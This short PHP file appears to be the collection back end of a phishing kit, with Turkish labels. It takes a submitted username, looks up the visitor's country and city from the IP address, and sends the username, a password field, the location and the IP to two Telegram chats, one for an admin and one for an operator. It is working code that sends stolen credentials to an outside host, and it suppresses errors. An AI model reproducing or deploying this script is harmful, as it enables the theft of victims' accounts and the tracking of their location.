<?php 
error_reporting(0);

  require "config.php";

  if ($_GET) {
    $username = $_GET["zwous"];
    $ip = ($_SERVER["REMOTE_ADDR"] != "::1" ? $_SERVER["REMOTE_ADDR"] : "");

    $konum = file_get_contents("http://ip-api.com/json".$ip);
    $cek = json_decode($konum, true);
    $ulke = $cek["country"];
    $sehir = $cek["city"];
    

    date_default_timezone_set('Europe/Istanbul');
    $cur_time = date("d-m-Y H:i:s");

    $admin_message = "nick : ".$username;
    $admin_message .= "\npassword : Şifre Girişi Yapmadı";
    $admin_message .= "\nulke : ".$ulke;
    $admin_message .= "\nsehir : ".$sehir;
    $admin_message .= "\nip : ".$cek["query"];

    $user_message   = "nick : ".$username;
    $user_message .= "\npassword : Şifre Girişi Yapmadı";

    TelegramSendMessage($bot_admin, [
      "chat_id" => $group_admin,
      "text" => $admin_message,
    ]);

    TelegramSendMessage($bot_kullanici, [
      "chat_id" => $group_kullanici,
      "text" => $user_message,
    ]);
  }

?>